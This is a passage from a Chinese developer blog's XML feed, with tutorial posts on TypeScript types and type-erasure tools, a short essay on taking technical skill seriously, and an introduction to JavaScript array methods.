function_">newFn</span>(<span class="attr">x</span>: <span class="built_in">string</span>): <span class="built_in">void</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> s = <span class="string">&#x27;string&#x27;</span></span><br><span class="line">s.<span class="title function_">newFn</span>(<span class="string">&#x27;xxx&#x27;</span>) <span class="comment">// 此时不会报错</span></span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/img_3.png"></p><ul><li>区别1：<ul><li>interface 只描述对象</li><li>type 则描述所有数据</li></ul></li><li>区别2：<ul><li>type 只是别名</li><li>interface 则是类型声明</li></ul></li><li>区别3：<ul><li>对外 API 尽量用 interface，方便拓展</li><li>对内 API 尽量用 type，防止代码分散</li></ul></li></ul><p>看起来 type 的应用范围更广，且包括 interface，看起来 interface 没有必要出现。其实是原因之一为了迎合面向对象粉丝的需求</p><h4 id="听说-type-不能继承？"><a href="#听说-type-不能继承？" class="headerlink" title="听说 type 不能继承？"></a>听说 type 不能继承？</h4><p>瞎说！</p><p>继承的本质是什么？就是一个东西拥有另一个东西的属性</p><p>这个东西很容易实现，比如说复制</p><p>那 type 怎么拓展？</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MyAxiosRTequestConfig</span>  = <span class="title class_">AxiosRTequestConfig</span>  &amp; &#123; _autoLoading?: <span class="built_in">boolean</span>; &#125;</span><br></pre></td></tr></table></figure><p>几乎是一样的效果，而且更安全，不会修改到原先的类型。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/img_4.png"></p>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：类型（上）</title>
      <link href="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8A%EF%BC%89/index/"/>
      <url>/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8A%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<h2 id="JS-x2F-TS-中有哪些数据-data-类型-type"><a href="#JS-x2F-TS-中有哪些数据-data-类型-type" class="headerlink" title="JS&#x2F;TS 中有哪些数据(data)类型(type)"></a>JS&#x2F;TS 中有哪些数据(data)类型(type)</h2><ul><li>JS<ul><li>null, undefined, string, number, boolean, bigint, symbol, obejct(含 Array、Function、Date…)</li></ul></li><li>TS<ul><li>以上所有，加上 void, never, enum, unknown, any，再加上<strong>自定义类型 type, interface</strong></li></ul></li></ul><h2 id="如何理解-TS-的数据类型"><a href="#如何理解-TS-的数据类型" class="headerlink" title="如何理解 TS 的数据类型"></a>如何理解 TS 的数据类型</h2><p>和 JS 的区别在于，JS 说到数据类型的时候，是说这个值是字符串，这个值就是数字，</p><p>那么 TS 呢，指的是一类数据的类型，而不是一个，所以说得从集合的角度来理解<br>例如：</p><ul><li>number 是指 1 | 1.1 | 1.2 | …. | 2 | …</li><li>string 是指 a | b | … | z | …</li><li>boolean 是指 true | false</li><li>Object 是指 {…} | Array | Function | String | Number | … | RegExp | …</li></ul><blockquote><p>注意：Object 这里 为什么还会有 String，Number？<br>这里涉及到 JS 的历史遗留知识，<strong>42 VS new Number(42)</strong><br>基本没有人会用 new Number(42) 来表示“42”<br>42 就是一个普通的值<br>而 new Number(42)，则表示这是一个对象：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">  constructor:</span> ....,</span><br><span class="line"><span class="symbol">  toFixed:</span> ...,</span><br><span class="line"><span class="symbol">  toString:</span> ...,</span><br><span class="line"><span class="symbol">  valueOf:</span> function() <span class="punctuation">&#123;</span></span><br><span class="line">    return <span class="number">42</span> </span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>但是 (42).toFixed()，为什么可以正常运行，明显不合逻辑<br>当然是因为 JS 的包装对象，在你写上述代码的时候，JS 帮你做了这四步：</p><ol><li>let temp &#x3D; new Number(42); 2. value &#x3D; temp.toFixed(2); 3. 删除 temp; 4. 返回 value;</li></ol><p>所以 JS 中的 Number, String, Boolean 只用于包装对象，正常来说不会用到他们，当然在 TS 里也不用</p></blockquote><blockquote><p>那么问题又来了，<code>var n = 42; n.xxx = 2; console.log(n.xxx)</code>，会打印出什么呢？</p></blockquote><h2 id="用类型签名和Rercord描述对象"><a href="#用类型签名和Rercord描述对象" class="headerlink" title="用类型签名和Rercord描述对象"></a>用类型签名和Rercord描述对象</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="title class_">Object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>:A = <span class="number">1</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">a1</span>:A = <span class="function">() =&gt;</span> &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">a2</span>:A = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">a3</span>:A = <span class="regexp">/a+b/</span></span><br></pre></td></tr></table></figure><p><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8A%EF%BC%89/index/img.png"></p><blockquote><p>这和 any 有什么区别嘛，所以我们一般在 TS 里不用 Object</p></blockquote><p>那么用什么呢？</p><ul><li>用 class &#x2F; constructor 描述，例如：<code>const a: Function = () =&gt; &#123;&#125;</code></li><li>用 type 或 interface 描述，例如：<code>type Person = &#123; name: string; age: number; &#125;</code>，我们比较常用的是索引签名 <code>type A = &#123; [k: string]: number &#125;</code>（这个语法特别丑），所以我们一般用 <code>Record&lt;string, number&gt;</code></li></ul><h4 id="思考：key-的类型可以不是-string-x2F-symbol-吗？"><a href="#思考：key-的类型可以不是-string-x2F-symbol-吗？" class="headerlink" title="思考：key 的类型可以不是 string&#x2F;symbol 吗？"></a>思考：key 的类型可以不是 string&#x2F;symbol 吗？</h4><p>试一下就知道了</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = Record&lt;<span class="keyword">number</span>, <span class="keyword">number</span>&gt;</span><br><span class="line"></span><br><span class="line">const a: A = &#123;</span><br><span class="line">  <span class="keyword">name</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="number">123</span>: <span class="number">6</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8A%EF%BC%89/index/img_1.png"></p><blockquote><p>当 key 的类型是 number 的时候，虽然 js 不支持，但 ts 只会做字面量上的检查</p></blockquote><h2 id="用-和Array泛型来描述数组对象"><a href="#用-和Array泛型来描述数组对象" class="headerlink" title="用[]和Array泛型来描述数组对象"></a>用[]和Array泛型来描述数组对象</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="built_in">string</span>[]</span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: A = [<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>]</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">type</span> A = <span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: A = [<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> D = [<span class="built_in">string</span>, <span class="string">&#x27;string&#x27;</span>] <span class="comment">// 二元组</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">d</span>: D = [<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> D = [<span class="built_in">string</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;string&#x27;</span>] <span class="comment">// 三元组</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">d</span>: D = [<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> E = [<span class="built_in">number</span>[], <span class="built_in">string</span>]</span><br><span class="line"><span class="keyword">const</span> <span class="attr">e</span>: E = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], <span class="string">&#x27;abc&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: A = ???</span><br></pre></td></tr></table></figure><p>只能为 [1,2,3]，注意这里的 type A 不是值，1 也是类型，是 number 的子集</p><h2 id="描述函数对象"><a href="#描述函数对象" class="headerlink" title="描述函数对象"></a>描述函数对象</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">FnA</span> = <span class="function">(<span class="params">a, <span class="built_in">number</span>, b: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">fnA</span>: <span class="title class_">FnA</span> = <span class="function">() =&gt;</span> <span class="number">1</span> <span class="comment">// 这里即使不写参数也可以，ts 在这里的检查是松散的，后面会在类型兼容中细讲</span></span><br></pre></td></tr></table></figure><p>返回值为 void 和 undefined 的时候</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">FnA</span> = <span class="function">() =&gt;</span> <span class="built_in">void</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">fnA</span>: <span class="title class_">FnA</span> = <span class="function">() =&gt;</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">FnB</span> = <span class="function">() =&gt;</span> <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">fnB</span>: <span class="title class_">FnB</span> = <span class="function">() =&gt;</span> &#123;&#125; <span class="comment">// 这里报错，似乎与 js 的表现不太一样，按理来说 js 的函数不写返回值，那么默认就是返回 undefined</span></span><br></pre></td></tr></table></figure><blockquote><p>所以在实践中，我们的函数没有返回值，我们一般写 void</p></blockquote><p>怎么描述函数的 this</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里名称必须为 this</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">FnWithThis</span> = <span class="function">(<span class="params"><span class="variable language_">this</span>: &#123;name: <span class="built_in">string</span>; age: <span class="built_in">number</span>;&#125;, name: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">fnWithThis</span>: <span class="title class_">FnWithThis</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hi&#x27;</span>, <span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时调用只能显示指定 this</span></span><br><span class="line"><span class="title function_">fnWithThiscall</span>(&#123;<span class="attr">name</span>: <span class="string">&#x27;hh&#x27;</span>, <span class="attr">age</span>: <span class="number">18</span>&#125;, <span class="string">&#x27;jack&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>由于 Function 不够精确，所以 TS 开发者一般用 <code>() =&gt; ?</code> 来描述函数<br>其他对象一般直接用 class 来描述</p></blockquote><h2 id="其他对象"><a href="#其他对象" class="headerlink" title="其他对象"></a>其他对象</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">d</span>: <span class="title class_">Date</span> = <span class="keyword">new</span> <span class="title class_">Date</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="attr">r</span>: <span class="title class_">RegExp</span> = <span class="regexp">/ab+c/</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">r2</span>: <span class="title class_">RegExp</span> = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;ab+c&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="attr">m</span>: <span class="title class_">Map</span>&lt;<span class="built_in">string</span>, <span class="built_in">number</span>&gt; = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="attr">wm</span>: <span class="title class_">WeakMap</span>&lt;&#123;<span class="attr">name</span>: <span class="built_in">string</span>&#125;, <span class="built_in">number</span>&gt; = <span class="keyword">new</span> <span class="title class_">WeakMap</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="attr">s</span>: <span class="title class_">Set</span>&lt;<span class="built_in">number</span>&gt; = <span class="keyword">new</span> <span class="title class_">Set</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="attr">ws</span>: <span class="title class_">Set</span>&lt;&#123;<span class="attr">name</span>: <span class="built_in">string</span>&#125;, <span class="built_in">number</span>&gt; = <span class="keyword">new</span> <span class="title class_">WeakSet</span>()</span><br></pre></td></tr></table></figure><h2 id="any、unknown-是什么？"><a href="#any、unknown-是什么？" class="headerlink" title="any、unknown 是什么？"></a>any、unknown 是什么？</h2><p>any 更像是所有的值的集合（也不准确），unknown 和 any 差不多，只是你不收窄类型你就无法使用</p><p><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8A%EF%BC%89/index/img_2.png"></p><blockquote><p>在<a href="https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#any">官方文档</a>中 any 的解释为如果你不想让你的类型报错你可以使用这个类型<br><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%8A%EF%BC%89/index/img_3.png"></p></blockquote><h2 id="never-是什么"><a href="#never-是什么" class="headerlink" title="never 是什么"></a>never 是什么</h2><p>可以理解为空集，哪有什么用呢？用来做检查</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="built_in">string</span> &amp; <span class="built_in">number</span></span><br><span class="line"><span class="comment">// string 和 number 的交集是什么呢？就是 never</span></span><br><span class="line"><span class="comment">// 一般没人会这么写</span></span><br><span class="line"><span class="keyword">type</span> B = <span class="built_in">string</span> | <span class="built_in">number</span> | <span class="built_in">boolean</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">b</span>:B</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> b === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">  a.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> b === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">  a.<span class="title function_">toFixed</span>(<span class="number">2</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> a === <span class="string">&#x27;boolean&#x27;</span>) &#123;</span><br><span class="line">  a.<span class="title function_">valueOf</span>()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没了&#x27;</span>)</span><br><span class="line">  <span class="comment">// 此时这里的 a 就是 never 了，</span></span><br><span class="line">  <span class="comment">// 上面已经把该有的可能都排除了，但是如果让你告诉我这里的 a 是什么类型，怎么解释</span></span><br><span class="line">  <span class="comment">// 为了解释这种类型，所以才有 never</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：起手</title>
      <link href="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E8%B5%B7%E6%89%8B/index/"/>
      <url>/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E8%B5%B7%E6%89%8B/index/</url>
      
        <content type="html"><![CDATA[<h2 id="类型擦除"><a href="#类型擦除" class="headerlink" title="类型擦除"></a>类型擦除</h2><p>如何运行 TypeScript 用一张图就可以说明</p><p><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E8%B5%B7%E6%89%8B/index/img.png"></p><blockquote><ol><li>如何运行一段 JS 代码（图左），只需要放进 Chrome 或者 Node 中即可</li><li>但是如果只加了一点类型 number，再放进 Chrome 或者 Node 则会报错，所以我们需要把 ts 变成 js，然后再运行 ，<strong>这个过程就叫做类型擦除</strong>。</li></ol></blockquote><h3 id="如何进行类型擦除"><a href="#如何进行类型擦除" class="headerlink" title="如何进行类型擦除"></a>如何进行类型擦除</h3><ol><li><ul><li>npm i -g esbuild</li></ul></li></ol><ul><li>esbuild 1.ts &gt; 1.js</li></ul><ol><li><ul><li>npm i -g @swc&#x2F;cli @swc&#x2F;core</li></ul></li></ol><ul><li>swc 1.ts -o 1.js</li></ul><ol><li><ul><li>npm i -g typescript</li></ul></li></ol><ul><li>tsc 1.ts</li></ul><ol><li><ul><li>npm i @babel&#x2F;core @babel&#x2F;cli @babel&#x2F;preset-typescript</li></ul></li></ol><ul><li>babel – presets @babel&#x2F;preset-typescript 1.ts</li></ul><blockquote><p>前两个快一点（因为不检查语法，反正都要擦除，没什么好检查了）<br>后面两个因为还要做类型检查，所以相对慢多了（但是即使不做检查，也会比上面那俩慢），基本已经不用了</p></blockquote><p><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E8%B5%B7%E6%89%8B/index/img_1.png"></p><h2 id="Playground"><a href="#Playground" class="headerlink" title="Playground"></a>Playground</h2><p>每次写完 ts 代码都要类型擦除后才能运行，太麻烦了，推荐几个在线的：</p><ul><li><a href="https://www.typescriptlang.org/play">https://www.typescriptlang.org/play</a></li><li><a href="https://playcode.io/%EF%BC%88%E7%9B%AE%E5%89%8D%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%BF%AB%E7%9A%84%E5%89%8D%E7%AB%AF%E5%9C%A8%E7%BA%BF%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%8C%E7%BC%BA%E7%82%B9%E6%98%AF%E6%94%B6%E8%B4%B9%EF%BC%89">https://playcode.io/（目前世界上最快的前端在线编辑器，缺点是收费）</a></li><li><a href="https://stackblitz.com/">https://stackblitz.com/</a></li><li><a href="https://codesandbox.io/">https://codesandbox.io/</a></li></ul><p>本地编辑+浏览器</p><ul><li>vite：npm create vite@latest my-vue-app – –template vanilla-ts</li><li>ts-node：<a href="https://typestrong.org/ts-node/docs/installation">https://typestrong.org/ts-node/docs/installation</a></li><li>swc-node：<a href="https://github.com/swc-project/swc-node">https://github.com/swc-project/swc-node</a></li><li>esm-loader：<a href="https://github.com/esbuild-kit/esm-loader">https://github.com/esbuild-kit/esm-loader</a></li><li>esno：<a href="https://github.com/esbuild-kit/esno">https://github.com/esbuild-kit/esno</a></li><li>这些也许以后就不维护了，以后还是得用新工具</li></ul><h2 id="如何调试-TypeScript"><a href="#如何调试-TypeScript" class="headerlink" title="如何调试 TypeScript"></a>如何调试 TypeScript</h2><p>此调试非彼调试</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Name</span> = <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Age</span> = <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">type</span> X = <span class="title class_">Name</span> &amp; <span class="title class_">Age</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(X) <span class="comment">// 报错！</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>:<span class="built_in">number</span> = <span class="number">1</span> + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br></pre></td></tr></table></figure><blockquote><p>我们如果想知道 type X 是什么，如何做到，肯定不能用 console.log，他只能打印值，而且如果是运行时，ts 代码都被擦除了，行不通<br>所以正确的方式是用鼠标：<br><img src="/Blog/2023/06/04/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E8%B5%B7%E6%89%8B/index/img_2.png"><br>无需 log，无需运行，在你写代码的时候，编辑器已经给你计算好了</p></blockquote><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><h3 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h3><ul><li>编程与类型系统（推荐一点，薄一点）</li><li>TypeScript 编程（根据网上的评论，更适合新手）</li><li>类型和程序设计语言（相当抽象，如果你希望对类型更加深刻，可以看看）</li><li>入门教程：<a href="https://ts.xcatliu.com/">https://ts.xcatliu.com/</a></li></ul><blockquote><p>类型体操<br>可能很多人一开始做不来不适应，根本原因是类型体操的本质是<strong>函数式编程</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>技术重视</title>
      <link href="/Blog/2023/05/05/daisy/%E6%8A%80%E6%9C%AF%E9%87%8D%E8%A7%86/index/"/>
      <url>/Blog/2023/05/05/daisy/%E6%8A%80%E6%9C%AF%E9%87%8D%E8%A7%86/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>人们总是<br>在短期高估技术<br>在长期低估技术</p></blockquote><p>你是一个技术人员，你会长期的高估技术吗？</p><p>即使是技术人人员本身也是这样，短期学点技术就能赚点钱，长期来说也是非常低估的，我为什么要搞十年二十年技术，我肯定要在三十岁转管理，说明技术人员并不重视技术</p><p>很多搞技术的人开始进入公司以后，就不怎么搞技术了，更愿意重视人际关系，怎么转管理，怎么搞业务，一个表现就是一年看不完一本技术书，可能桌面放着好几本，其实都没看完，<strong>这其实不是懒，而是你对技术的重视程度下降了</strong>，会觉得目前的技术能够做好工作了，后面不用再接触新的技术了（大环境好可以这样，但是现在环境差会越来越难）</p><p>希望大家能够重视技术，30岁之前人际关系、管理不是那么重要的，就专心搞技术</p>]]></content>
      
      
      <categories>
          
          <category> daisy </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS 数组真强大</title>
      <link href="/Blog/2023/03/12/javascript/JS%E6%95%B0%E7%BB%84%E7%9C%9F%E5%BC%BA%E5%A4%A7/index/"/>
      <url>/Blog/2023/03/12/javascript/JS%E6%95%B0%E7%BB%84%E7%9C%9F%E5%BC%BA%E5%A4%A7/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>其实 JS 的数组可以玩的很花，但是很多人没有发现(不管你会不会，在我面前都属于不了解)</p></blockquote><h2 id="先来看5个简单的-api"><a href="#先来看5个简单的-api" class="headerlink" title="先来看5个简单的 api"></a>先来看5个简单的 api</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">const a = []</span><br><span class="line">a.push(<span class="number">1</span>)</span><br><span class="line"><span class="regexp">//</span> <span class="number">1</span>W</span><br><span class="line">a.push(<span class="number">2</span>)</span><br><span class="line"><span class="regexp">//</span> <span class="number">2</span></span><br><span class="line">a.push(<span class="number">100</span>, <span class="number">200</span>)</span><br><span class="line"><span class="regexp">//</span> <span class="number">4</span></span><br><span class="line">a.pop()</span><br><span class="line"><span class="regexp">//</span> <span class="number">200</span></span><br><span class="line">a.pop()</span><br><span class="line"><span class="regexp">//</span> <span class="number">100</span></span><br><span class="line">a.pop()</span><br><span class="line"><span class="regexp">//</span> <span class="number">2</span></span><br><span class="line">a.pop()</span><br><span class="line"><span class="regexp">//</span> <span class="number">1</span></span><br><span class="line">a.pop()</span><br><span class="line"> <span class="regexp">//</span> undefined 此时就能发现 JS 有点傻了</span><br><span class="line">a.push(undefined); a.pop()</span><br><span class="line"><span class="regexp">//</span> undefined 这么一来就分不清了，这个 undefined 是数组里面的，还是弹出来的</span><br><span class="line">a.unshift(<span class="number">100</span>)</span><br><span class="line"><span class="regexp">//</span> <span class="number">1</span></span><br><span class="line">a.unshift(<span class="number">200</span>)</span><br><span class="line"><span class="regexp">//</span> <span class="number">2</span> 这个 api 和 push 很像，只不过是从前面塞进去</span><br><span class="line">a.shift()</span><br><span class="line"><span class="regexp">//</span> <span class="number">200</span></span><br><span class="line">a.shift()</span><br><span class="line"><span class="regexp">//</span> <span class="number">100</span></span><br><span class="line">a.shift()</span><br><span class="line"><span class="regexp">//</span> undefined</span><br></pre></td></tr></table></figure><p><img src="/Blog/2023/03/12/javascript/JS%E6%95%B0%E7%BB%84%E7%9C%9F%E5%BC%BA%E5%A4%A7/index/img.png"></p><h3 id="应用一"><a href="#应用一" class="headerlink" title="应用一"></a>应用一</h3><p>翻转字符串</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;abcdef&#x27;</span><span class="selector-class">.split</span>()<span class="selector-class">.reverse</span>()<span class="selector-class">.join</span>()</span><br></pre></td></tr></table></figure><h3 id="应用二"><a href="#应用二" class="headerlink" title="应用二"></a>应用二</h3><p>发布订阅</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const eventBus = &#123;</span><br><span class="line">  on() &#123;&#125;, // addEventListener</span><br><span 